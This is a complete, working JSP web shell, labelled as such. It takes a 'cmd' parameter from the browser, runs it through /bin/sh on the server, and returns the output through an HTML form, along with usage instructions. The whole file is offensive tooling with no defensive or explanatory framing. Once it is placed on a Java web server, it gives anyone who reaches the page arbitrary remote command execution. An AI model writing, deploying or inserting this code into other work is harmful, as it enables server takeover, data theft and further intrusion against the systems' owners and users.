<%@ page import="java.io.*" %>
<%@ page import="java.lang.*" %>
<%
/**
 * JSP Command Webshell
 * Usage: Access via browser with ?cmd=command
 * Example: shell.jsp?cmd=id
 */

String cmd = request.getParameter("cmd");
if (cmd != null) {
    try {
        // Execute system command
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        
        // Read output
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream())
        );
        
        String line;
        out.println("<pre>");
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
        
        br.close();
        p.waitFor();
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
}
%>

<html>
<body>
    <h2>JSP Command Webshell</h2>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command" size="50">
        <input type="submit" value="Execute">
    </form>
</body>
</html>
